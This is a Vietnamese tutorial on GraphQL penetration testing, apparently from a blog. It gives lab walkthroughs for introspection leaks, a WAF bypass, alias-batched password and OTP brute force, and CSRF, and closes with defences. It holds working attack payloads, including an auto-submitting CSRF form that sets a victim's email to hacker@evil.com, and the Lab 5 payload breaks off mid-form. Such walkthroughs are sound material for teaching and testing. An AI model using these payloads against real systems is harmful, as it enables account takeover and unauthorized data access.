## **1. Tổng quan về GraphQL và các rủi ro bảo mật đặc thù**

### 1.1. GraphQL vs REST API

Khác biệt lớn nhất về mặt kiến trúc giữa GraphQL và REST nằm ở cách thiết kế Endpoint và định dạng luồng dữ liệu trả về:

- **REST API:** Dựa trên kiến trúc Multi-endpoint. Mỗi tài nguyên sẽ tương ứng với một URI cụ thể (VD: `/api/users`, `/api/posts`). Cấu trúc dữ liệu trả về là cố định do server định nghĩa.
- **GraphQL:** Dựa trên kiến trúc Single-endpoint. Tất cả các request thường chỉ giao tiếp qua một URI duy nhất (VD: `/graphql` hoặc `/api`). Client có quyền tự định nghĩa cấu trúc dữ liệu cần lấy thông qua câu truy vấn, và server chỉ trả về chính xác các trường được yêu cầu.

Việc dồn traffic vào một endpoint duy nhất khiến các rule bảo mật dựa trên URI path trở nên kém hiệu quả hơn, tuy nhiên WAF hiện đại vẫn có thể phân tích payload GraphQL ở tầng body để áp dụng các cơ chế bảo vệ.

### 1.2. Các Operations cốt lõi

Giao tiếp trong GraphQL được chia thành 3 loại Operation chính:

- **Query:** Tương đương với method GET trong REST, dùng để truy xuất dữ liệu.
- **Mutation:** Tương đương với các method POST, PUT, DELETE. Dùng để thực thi các tác vụ thay đổi trạng thái dữ liệu trên server (thêm, sửa, xóa).
- **Subscription:** Duy trì kết nối (thường qua WebSockets) để server push dữ liệu real-time về phía client.

Trong phạm vi Penetration Testing đối với ứng dụng web, các vector tấn công thường tập trung vào Query và Mutation.

### 1.3. Nguyên nhân gây ra lỗ hổng trên GraphQL

GraphQL không mặc định cung cấp các cơ chế bảo mật như xác thực hay phân quyền) Sự phức tạp trong việc triển khai dẫn đến 3 nhóm rủi ro chính:

- **Lỗ hổng Access Control tại tầng Resolver:** Trong REST, việc kiểm tra quyền truy cập thường diễn ra tại Endpoint. Trong GraphQL, dữ liệu được phân giải bởi các hàm gọi là **Resolvers**. Quá trình phân quyền phải được lập trình viên thực hiện thủ công trên từng field một. Nếu thiếu sót Access Control ở các field nhạy cảm nằm sâu trong cấu trúc Query, attacker có thể truy xuất dữ liệu trái phép.
- **Tính năng Introspection:** Đây là tính năng built-in cho phép client truy vấn trực tiếp vào hệ thống để lấy metadata về toàn bộ schema của API. Nếu không bị vô hiệu hóa trên môi trường Production, attacker có thể gửi query `__schema` để trích xuất toàn bộ tài liệu về Queries, Mutations, và Data Types. Việc này giúp giai đoạn recon trở nên chính xác tuyệt đối.
- **Khai thác Aliases:**
  GraphQL hỗ trợ tính năng Aliases, cho phép client gom nhiều operations độc lập vào chung một HTTP Request. Attacker có thể lợi dụng tính năng này để thực hiện hàng trăm, hàng ngàn lượt đoán (Brute-force mật khẩu, OTP, v.v.) chỉ với duy nhất một request, dễ dàng bypass các cơ chế Rate Limiting đếm số lượng HTTP request thông thường.

## 2. Xác định Endpoint và trích xuất Schema

Trong kiểm thử bảo mật GraphQL, do không có các API documentation (như Swagger trong REST) cung cấp sẵn, việc định vị chính xác endpoint và tái tạo lại cấu trúc dữ liệu là bước tiên quyết để tìm ra các vector tấn công.

### 2.1. Dò tìm GraphQL Endpoints

GraphQL giao tiếp qua một endpoint duy nhất. Nếu ứng dụng không bộc lộ rõ request trong Proxy History, attacker cần chủ động fuzzing các đường dẫn phổ biến.

- **Các đường dẫn mặc định thường gặp:** `/graphql`, `/api`, `/api/graphql`, `/v1/graphql`, `/graphql/console`.
- **Payload xác nhận:** Để kiểm tra một endpoint có đang chạy GraphQL engine hay không, chúng ta gửi một HTTP request (thường là POST) chứa query cơ bản nhất:GraphQL
  ```graphql
  query {
    __typename
  }
  ```
  Nếu server phản hồi trả về kiểu dữ liệu `{"data": {"__typename": "Query"}}`, endpoint đó đã được xác nhận.

### 2.2. Nhận diện hệ thống thông qua Error Messages

GraphQL engine có xu hướng trả về các thông báo lỗi cực kỳ chi tiết. Khi quá trình dò tìm ban đầu bị filter, việc gửi các payload sai định dạng là một kỹ thuật hữu ích.

- Việc server trả lời với các mã lỗi đặc thù của GraphQL như `"Syntax Error: Expected Name, found <EOF>"` hoặc `"Validation error"` là dấu hiệu nhận biết hệ thống backend.
- Ngoài ra, các error messages này thường tiết lộ thông tin về kiểu dữ liệu được yêu cầu hoặc các lỗi logic bên trong Resolver, hỗ trợ đắc lực cho quá trình Fuzzing sau này.

### 2.3. Khai thác tính năng Introspection

Introspection là tính năng cốt lõi cho phép client gửi truy vấn để lấy metadata về toàn bộ API. Nếu không bị vô hiệu hóa trên Production, thì có thể dẫn đến Information Disclosure nghiêm trọng ở giai đoạn Recon nếu không được cấu hình đúng.

- Bằng cách sử dụng từ khóa `__schema`, attacker có thể trích xuất toàn bộ danh sách các Queries, Mutations, Types, và Arguments.
- **Payload cơ bản:**
  ```graphql
  query {
    __schema {
      types {
        name
        fields {
          name
          type {
            name
          }
        }
      }
    }
  }
  ```
- Dữ liệu JSON trả về sau đó có thể được nạp vào các công cụ như extension **InQL** (trên Burp Suite) hoặc **GraphQL Voyager** để trực quan hóa thành sơ đồ quan hệ. Việc này giúp Penetration Tester mapping toàn bộ hệ thống và nhanh chóng định vị các function nhạy cảm như `updateRole`, `deleteUser`, hoặc các API nội bộ chưa được publish.

### 2.4. Kỹ thuật Bypass các cơ chế chặn Introspection

Thực tế, nhiều hệ thống đã cấu hình Web Application Firewall (WAF) để chặn các request chứa chuỗi `__schema` hoặc tắt Introspection một phần. Attacker có thể áp dụng các kỹ thuật sau để bypass:

- **Lợi dụng đặc tính của GraphQL Parser:** GraphQL parser bỏ qua các khoảng trắng, tab, ký tự ngắt dòng và dấu phẩy. Thay vì gửi `__schema`, attacker có thể chèn các ký tự này để qua mặt các rule Regex đơn giản của WAF:
  - Dùng dấu phẩy: `__schema, { types { name } }`
  - Dùng ngắt dòng: `__schema \n { types { name } }`
- **Chuyển đổi HTTP Method (POST sang GET):** Một số WAF chỉ được cấu hình để scan payload trong HTTP POST Body. Bằng cách chuyển đổi method sang GET và truyền query thông qua tham số URL (`?query=...`), request có thể bypass lớp filter này.
- **Khai thác tính năng Field Suggestion:** Nếu Introspection bị vô hiệu hóa hoàn toàn, hệ thống vẫn có thể bị rò rỉ cấu trúc thông qua tính năng gợi ý mặc định của GraphQL.
  - Ví dụ: Nếu gửi truy vấn `query { usr { id } }`, server có thể trả về lỗi: `"Cannot query field 'usr' on type 'Query'. Did you mean 'user' or 'users'?"`.
  - Bằng cách sử dụng công cụ tự động, attacker có thể brute-force từ điển để khôi phục lại phần lớn Schema mà không cần gọi trực tiếp `__schema`.

## 3. Phân tích các lỗ hổng bảo mật phổ biến trên GraphQL

Khi đã định vị được Endpoint và nếu may mắn dump được toàn bộ Schema, bước tiếp theo là tiến hành phân tích các vector tấn công. Dưới đây là 3 nhóm lỗ hổng nguy hiểm và mang tính đặc thù nhất của GraphQL.

### 3.1. Information Disclosure & Broken Access Control tại tầng Resolver

Như đã đề cập ở phần kiến trúc, GraphQL yêu cầu lập trình viên phải thực hiện phân quyền thủ công trên từng trường dữ liệu thay vì chỉ ở cấp độ Endpoint. Sự thiếu sót trong quá trình map quyền này dẫn đến việc lộ lọt dữ liệu nhạy cảm.

- **Cơ chế khai thác:** Attacker truy vấn các Object hợp lệ mà họ có quyền truy cập, nhưng cố tình gọi thêm các trường dữ liệu nội bộ chưa được gán rule kiểm tra quyền.
- **Ví dụ thực tế:** Một user thông thường có quyền truy vấn thông tin profile của chính mình. Tuy nhiên, bằng cách phân tích schema, attacker phát hiện ra object `User` có chứa field `role` và `internal_notes`.
  ```graphql
  query {
    user(id: 1337) {
      username
      email
      role # Field nhạy cảm thiếu access control
      internal_notes # Field chứa ghi chú của admin
    }
  }
  ```
  Nếu Resolver của `role` hoặc `internal_notes` không kiểm tra context xem người dùng hiện tại có phải là Admin hay không, lỗ hổng Broken Access Control sẽ xảy ra, trả về toàn bộ dữ liệu ẩn.

### 3.2. Bypassing Rate Limiting & Brute-force thông qua Aliases

Tính năng **Aliases** của GraphQL cho phép client đổi tên các kết quả trả về, từ đó có thể gửi nhiều truy vấn (Queries) hoặc thao tác thay đổi dữ liệu (Mutations) hoàn toàn giống nhau nhưng với các tham số khác nhau trong cùng một HTTP Request.

- **Cơ chế khai thác:** Các cơ chế chống Brute-force hoặc Rate Limiting thông thường thường dựa trên việc đếm số lượng HTTP Request từ một IP trong một khoảng thời gian. GraphQL Aliases cho phép attacker gom hàng trăm payload vào một request duy nhất, khiến WAF chỉ ghi nhận 1 lượt truy cập.
- **Ví dụ thực tế:** Giả sử trong một hệ thống E-commerce có luồng xác thực bằng mã OTP. Việc brute-force OTP truyền thống sẽ nhanh chóng bị WAF chặn IP. Tuy nhiên, attacker có thể viết payload gom hàng loạt lượt đoán OTP như sau:
  ```graphql
  mutation {
    attempt1: verifyOTP(code: "0000") {
      success
    }
    attempt2: verifyOTP(code: "0001") {
      success
    }
    attempt3: verifyOTP(code: "0002") {
      success
    }
    # ...
    attempt999: verifyOTP(code: "0999") {
      success
    }
  }
  ```
  Server sẽ tuần tự phân giải từng alias và trả về một khối JSON chứa kết quả của toàn bộ các lần thử. Attacker bypass hoàn toàn giới hạn Rate Limit.

### 3.3. Cross-Site Request Forgery (CSRF) trong GraphQL

Mặc định, các request GraphQL chuẩn thường sử dụng `Content-Type: application/json`. Trình duyệt web không cho phép gửi request JSON phức tạp qua các form HTML thông thường (Cross-origin) mà không có preflight request (CORS), điều này vô tình giảm thiểu rủi ro CSRF.

Tuy nhiên, lỗ hổng xuất hiện khi cấu hình GraphQL engine chấp nhận các định dạng Content-Type lỏng lẻo hơn.

- **Khai thác qua `application/x-www-form-urlencoded`:** Nếu server chấp nhận định dạng này, attacker có thể tạo một trang HTML độc hại chứa một form ẩn tự động submit payload GraphQL (ví dụ: Mutation thay đổi email của nạn nhân).
  ```html
  <form action="https://target-site.com/graphql" method="POST">
    <input
      type="hidden"
      name="query"
      value="mutation { changeEmail(newEmail: 'hacker@evil.com') { success } }"
    />
    <script>
      document.forms[0].submit();
    </script>
  </form>
  ```
- **Khai thác qua HTTP GET:** Một số GraphQL framework hỗ trợ truyền query trực tiếp qua URL query string (`/graphql?query=mutation{...}`). Việc này biến ứng dụng thành mục tiêu hoàn hảo cho CSRF, attacker chỉ cần nhúng URL chứa payload vào thẻ `<img>` hoặc nạp qua các link ẩn để ép trình duyệt của nạn nhân thực thi thao tác thay đổi dữ liệu trái phép.

### Lab 1: Accessing private GraphQL posts

Trang blog của lab này chứa một bài viết ẩn có chứa một mật khẩu bí mật. Để giải quyết lab, thì mình sẽ tìm bài viết ẩn đó và nhập mật khẩu.

![image.png](/assets/img/20260418-graphql/image.png)

Kiểm tra HTTP history trong Burp Suite, ta phát hiện ứng dụng web đang giao tiếp qua endpoint `/graphql/v1`.

Các thao tác tải bài viết hiển thị trên trang chủ sử dụng GraphQL query có tên operation là `getBlogPosts`.

![image.png](/assets/img/20260418-graphql/image%201.png)

Để kiểm tra xem hệ thống có vô hiệu hóa Introspection hay không, ta gửi một truy vấn lấy cấu trúc cơ bản:

```jsx
"query":"query{__schema{types{ name fields{name}}}}"
```

![image.png](/assets/img/20260418-graphql/image%202.png)

Phân tích JSON response trả về, hệ thống lộ ra toàn bộ cấu trúc dữ liệu. Trong đó, đáng chú ý nhất là Object type có tên `BlogPost`.

Bên trong type `BlogPost` này, ngoài các trường thông thường như `id`, `title`, `author`, `summary`, ta phát hiện hệ thống khai báo thêm hai trường nội bộ là `isPrivate` và đặc biệt là `postPassword`. Đây chính là lỗ hổng Information Disclosure do thiếu Access Control ở tầng Resolver đối với các field nhạy cảm.

Dựa vào schema vừa dump được, ta tiến hành cấu trúc lại payload để truy vấn một bài viết cụ thể thông qua operation `getBlogPost` kèm theo biến `id`.

Ở đây ta sẽ gọi thêm trường `postPassword` vào khối truy vấn. Payload khai thác hoàn chỉnh như sau:

```graphql
query getBlogPost($id: Int!) {
  getBlogPost(id: $id) {
    image
    title
    author
    paragraphs
    postPassword
  }
}
```

![image.png](/assets/img/20260418-graphql/image%203.png)

Bằng cách thay đổi tham số `"id": 3` ở phần Variables, server đã xử lý truy vấn thành công và trả về toàn bộ nội dung bài viết ẩn.

Đọc JSON response, ta trích xuất được giá trị của trường `postPassword` là: `"p00cvqf0fe5zydent calyglycle1x76"`.

Sử dụng chuỗi mật khẩu vừa lấy được submit vào form yêu cầu của đề bài để solve lab.

### **Lab 2: Accidental exposure of private GraphQL fields**

Tính năng quản lý người dùng của lab này sử dụng GraphQL endpoint. Lỗ hổng Access Control tồn tại cho phép attacker ép API trả về các trường thông tin xác thực của người dùng. Để solve lab, cần lấy thông tin đăng nhập của admin, sau đó xóa user `carlos` .

![image.png](/assets/img/20260418-graphql/image%204.png)

Kiểm tra HTTP history trong Burp Suite, ta phát hiện ứng dụng web đang giao tiếp qua endpoint `/graphql/v1`.

Gửi truy vấn Introspection vào endpoint `/graphql/v1` với payload:

```jsx
{"query":"query{__schema{types{name fields{name}}}}"}
```

![image.png](/assets/img/20260418-graphql/image%205.png)

![image.png](/assets/img/20260418-graphql/image%206.png)

Đọc response, ta thấy được được một Type có tên là `User`. Phân tích sâu hơn, Type này chứa 3 trường dữ liệu: `id`, `username`, và đặc biệt là `password`. Đây là lỗi phân quyền tại Resolver.

Dựa vào các Query mặc định của hệ thống, ta tìm được operation `getUser` nhận đầu vào là biến `$id`.

Cấu trúc lại payload Query để gọi trường `password` của user có `id` là 1:

```graphql
{
    "query":"query getUser($id:Int!) {
      getUser(id:$id) {
          id
      username
      password
    }
    }",
    "variables":{
        "id":1
    }
}
```

![image.png](/assets/img/20260418-graphql/image%207.png)

Hệ thống trả về response chứa credentials của Admin:

`"username": "administrator"`,

`"password": "26y10cyrelarnybc2vks"`

Dùng tài khoản Administrator đăng nhập và xóa user `carlos` để hoàn thành lab.

![image.png](/assets/img/20260418-graphql/image%208.png)

### Lab 3: **Finding a hidden GraphQL endpoint**

Endpoint GraphQL bị ẩn và không thể tìm thấy thông qua thao tác click thông thường. Nó cũng được trang bị cơ chế chống Introspection. Cần tìm endpoint ẩn này và xóa user `carlos`.

![image.png](/assets/img/20260418-graphql/image%209.png)

Thử gửi GET request tới các endpoint phổ biến. Và tại endpoint `/api` server trả về mã lỗi `400 Bad Request` kèm thông báo đặc trưng của GraphQL: `"Query not present"`. Vậy endpoint chính là `/api`.

![image.png](/assets/img/20260418-graphql/image%2010.png)

Khi gửi payload `__schema` chuẩn, WAF chặn lại với thông báo: `"GraphQL introspection is not allowed, but the query contained __schema or __type"`.

![image.png](/assets/img/20260418-graphql/image%2011.png)

Lợi dụng cơ chế parser của GraphQL, ta bypass filter bằng cách chèn ký tự ngắt dòng ngay sau từ khóa `__schema` để trích xuất `mutationType`.

![image.png](/assets/img/20260418-graphql/image%2012.png)

Sau khi bypass và dump được schema, ta tìm thấy một mutation nhạy cảm là `deleteOrganizationUser`. Mutation này yêu cầu một đối tượng `input` chứa tham số `id`.

![image.png](/assets/img/20260418-graphql/image%2013.png)

Thực hiện truy vấn `getUser` để xác định `id` của user carlos

![image.png](/assets/img/20260418-graphql/image%2014.png)

Xây dựng payload để xóa user có `id` là 3 (của carlos):

```graphql
mutation {
  deleteOrganizationUser(input: { id: 3 }) {
    user {
      id
      username
    }
  }
}
```

![image.png](/assets/img/20260418-graphql/image%2015.png)

Response trả về xác nhận `"username": "carlos"` đã bị xóa thành công.

### Lab 4: **Bypassing GraphQL brute force protections**

Endpoint `/graphql/v1` có chứa tính năng login và được bảo vệ bởi cơ chế Rate Limiting, sẽ block nếu nhận quá nhiều request từ một IP. Sử dụng kỹ thuật Brute-force để đăng nhập vào tài khoản `carlos`.

![image.png](/assets/img/20260418-graphql/image%2016.png)

Luồng đăng nhập gọi `POST /graphql/v1` sử dụng operation `login`. Nếu brute-force mật khẩu bằng Intruder thông thường (gửi hàng loạt HTTP Request), IP sẽ ngay lập tức bị block.

![image.png](/assets/img/20260418-graphql/image%2017.png)

Thay vì gửi 100 HTTP request, ta sử dụng tính năng **Aliases** của GraphQL để gom 100 lượt đoán mật khẩu vào một HTTP Request duy nhất, qua mặt hoàn toàn bộ đếm Rate Limit.

Tạo một block payload lớn, mỗi alias (`bruteforce0`, `bruteforce1`,...) thử một mật khẩu khác nhau từ list:

```graphql
mutation {
  bruteforce0: login(input: { password: "123456", username: "carlos" }) {
    token
    success
  }
  bruteforce1: login(input: { password: "password", username: "carlos" }) {
    token
    success
  }
  # ...
  bruteforce39: login(input: { password: "buster", username: "carlos" }) {
    token
    success
  }
  # ...
}
```

![image.png](/assets/img/20260418-graphql/image%2018.png)

Sau khi gửi request chứa payload lên server, server trả về một khối JSON tương ứng.

Search trong response, ta thấy tại alias `"bruteforce39"`, trường `"success"` trả về `true` và lộ ra `"token": "MyCVh7383fj8jL4nquEDQL55gBG1"`. Mật khẩu đúng là `"buster"`.

### Lab 5: **Performing CSRF exploits over GraphQL**

Endpoint GraphQL quản lý user cho phép nhận request có `content-type` là `x-www-form-urlencoded`. Điều này dẫn đến lỗ hổng CSRF. Cần viết một script HTML chứa payload CSRF để ép nạn nhân đổi địa chỉ email, sau đó host lên Exploit Server.

![image.png](/assets/img/20260418-graphql/image%2020.png)

Trong quá trình test với tài khoản `wiener:peter`, thao tác đổi email sử dụng mutation `changeEmail` .

Header request hiển thị `Content-Type: x-www-form-urlencoded` , nghĩa là server không ép buộc `application/json` nghiêm ngặt, cho phép trình duyệt của nạn nhân tự động submit dữ liệu qua form HTML mà không bị CORS chặn.

![image.png](/assets/img/20260418-graphql/image%2021.png)

Ta dựng một thẻ `<form>` ẩn dùng method POST trỏ thẳng vào endpoint `/graphql/v1`. Các tham số GraphQL (`query`, `operationName`, `variables`) được convert thành các trường `<input>` ẩn.

```graphql
<html>
  <body>
    <form action="https://0aa900e8048de3b38013038600380030.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="&#32;&#32;&#32;&#32;mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;email&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#32;&#32;&#32;&#32;&#125;" />
```

## 5. Biện pháp phòng vệ - Xây dựng GraphQL API an toàn

Việc bảo mật GraphQL đòi hỏi sự kết hợp giữa thiết kế logic ở tầng ứng dụng và các cơ chế kiểm soát ở tầng mạng. Dưới đây là các phương pháp bắt buộc phải áp dụng để giảm thiểu các rủi ro đã nêu.

### 5.1. Vô hiệu hóa Introspection trên môi trường Production

Introspection là nguyên nhân chính dẫn đến lộ lọt cấu trúc hệ thống.

- **Tầng Application:** Cần config tắt hoàn toàn tính năng này trong GraphQL framework khi deploy lên Production.
- **Tầng Network/WAF:** Thiết lập các rule trên Web Application Firewall (như FortiWeb, ModSecurity) để tự động drop các HTTP request có chứa từ khóa `__schema` hoặc `__type` trong payload. Đồng thời, cấu hình tắt tính năng Field Suggestion (Gợi ý lỗi typo) để tránh bị brute-force schema.

### 5.2. Phân quyền (Authorization) ở cấp độ Resolver

Không giống REST, việc chặn quyền truy cập tại endpoint `/graphql` là vô nghĩa.

- Access Control phải được thực thi trực tiếp bên trong từng **Resolver function** hoặc ở tầng Business Logic độc lập bên dưới.
- Bất cứ khi nào một field nhạy cảm được gọi (ví dụ: `user.role`, `internal_notes`), hệ thống phải lấy thông tin user context (từ token xác thực) để kiểm tra lại quyền hạn ngay tại thời điểm đó, trước khi truy xuất dữ liệu từ Database.

### 5.3. Ngăn chặn DoS và tấn công Aliases Batching

Vì attacker có thể gom hàng trăm query vào một request (Aliases) hoặc viết các query lồng nhau quá sâu, việc đếm số lượng HTTP request là không đủ.

- **Query Depth Limiting:** Giới hạn độ sâu tối đa của một truy vấn (thường là 3-5 level) để ngăn chặn vòng lặp vô hạn gây cạn kiệt tài nguyên server (CPU/RAM).
- **Query Cost Analysis:** Gán điểm số (cost) cho từng field và operation. Trước khi thực thi, server sẽ parse payload, tính tổng điểm và tự động từ chối các request vượt ngưỡng giới hạn cho phép.
- **Rate Limiting theo Operation:** Đối với các dự án tự build luồng xác thực, không thể dùng các cơ chế rate limit mặc định theo URL. Cần parse thẳng vào JSON body của request GraphQL để trích xuất và đếm số lượng `Operation Name` hoặc đếm số lần gọi Mutation (như `login`, `verifyOTP`), từ đó block IP nếu có dấu hiệu brute-force.

### 5.4. Phòng chống Cross-Site Request Forgery (CSRF)

Để đóng hoàn toàn các vector tấn công CSRF qua GET hoặc các form ẩn:

- **Bắt buộc Content-Type:** Server cấu hình chỉ chấp nhận các request có header `Content-Type: application/json`. Bất kỳ request nào dùng `application/x-www-form-urlencoded` hoặc `multipart/form-data` (nếu không dùng để upload file) đều phải bị reject.
- **Chặn Mutation qua HTTP GET:** Đảm bảo hệ thống chỉ thực thi thao tác thay đổi dữ liệu khi nhận HTTP POST request.
- **Sử dụng CSRF Token:** Áp dụng cơ chế Anti-CSRF token truyền thống. Yêu cầu mọi request đến endpoint GraphQL phải đính kèm một custom header chứa token hợp lệ (ví dụ: `X-CSRF-Token: <token>`). Trình duyệt sẽ không tự động đính kèm custom header này trong các kịch bản CSRF cross-origin.
